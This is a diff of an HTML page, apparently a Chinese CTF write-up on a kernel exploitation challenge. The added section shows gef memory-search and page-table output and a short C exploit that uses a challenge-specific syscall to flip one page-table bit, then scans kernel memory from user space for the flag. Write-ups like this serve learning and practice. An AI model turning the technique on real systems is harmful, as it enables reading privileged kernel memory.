@@ -579,7 +579,58 @@ flag<span class="o">{</span>你怎么知道cameudis有对象了?<span class="o">
 
 <p>由于题目给出的 flag 直接存在于 ramdisk 里，因此也会被加载到内存中。我们可以先在调试环境搜索到 flag 的位置，然后在脚本中暴力搜索周围的内存空间。虽然 flag 的位置有随机性，但由于线性映射区都是大页映射，因此我们可以在修改完 1 个比特之后就开始搜索大页，甚至也可以使用类似于方法 1 中的套娃技巧，将控制范围再度扩大。</p>
 
-<p>不过由于笔者还没装好 <a href="https://github.com/bata24/gef">Kernel特化版gef</a>（这玩意一键安装脚本只支持 debian 系是什么鬼？），默认的 gef 又没办法在 qemu 模式下搜索内存，这种方法就先咕咕咕了！</p>
+<blockquote>
+  <p>不过由于笔者还没装好 <a href="https://github.com/bata24/gef">Kernel特化版gef</a>（这玩意一键安装脚本只支持 debian 系是什么鬼？），默认的 gef 又没办法在 qemu 模式下搜索内存，这种方法就先咕咕咕了！</p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef&gt; search-pattern "flag{"
+[+] Searching for 'flag{' in whole memory
+[+] In (0xffff888002200000-0xffff888002600000 [rw-] (0x400000 bytes)
+  0xffff888002251000:    66 6c 61 67 7b e4 bd a0  e6 80 8e e4 b9 88 e7 9f    |  flag{...........  |
+[+] In (0xffffffff82200000-0xffffffff82400000 [rw-] (0x200000 bytes)
+  0xffffffff82251000:    66 6c 61 67 7b e4 bd a0  e6 80 8e e4 b9 88 e7 9f    |  flag{...........  |
+gef&gt; va2pa 0xffff888002251000
+pml4e: 0x0000000002201067 at 0x03730888
+pdpte: 0x0000000002202067 at 0x02201000
+pde  : 0x80000000022001e3 at 0x02202088
+phy  : 0x2251000 [0x02200000-0x023fffff]
+gef&gt; va2pa 0xffffffff82251000
+pml4e: 0x0000000001e2f067 at 0x03730ff8
+pdpte: 0x0000000001e30063 at 0x01e2fff0
+pde  : 0x80000000022001e3 at 0x01e30088
+phy  : 0x2251000 [0x02200000-0x023fffff]
+</code></pre></div></div>
+
+<p>我们使用高级 gef 进行搜索，可以看到 flag 即出现于线性映射区，也出现于另外一个区域。但是如果解析其页表的话，就会发现线性映射区的那个地址只需要我们修改一个 bit 就可以从用户态进行读取了，范围为 <code class="language-plaintext highlighter-rouge">0x02200000-0x023fffff</code>。</p>
+
+<p>可以快速写出一个攻击与搜索脚本：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+ * exp2.c
+ * Copyright (C) 2025 y2 &lt;cameudis@gmail.com&gt;
+ *
+ * Distributed under terms of the MIT license.
+ */</span>
+
+<span class="cp">#include</span> <span class="cpf">"kernelpwn.h"</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="mi">468</span><span class="p">,</span> <span class="mh">0x2202088</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] syscall return: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
+
+    <span class="kt">uint64_t</span> <span class="n">a</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">a</span> <span class="o">=</span> <span class="mh">0xffff888002200000</span><span class="p">;</span> <span class="n">a</span> <span class="o">&lt;</span> <span class="mh">0xffff8880023fffff</span><span class="p">;</span> <span class="n">a</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">,</span> <span class="s">"flag{"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"[*] found flag string at: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] flag: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
 
 <hr />
 
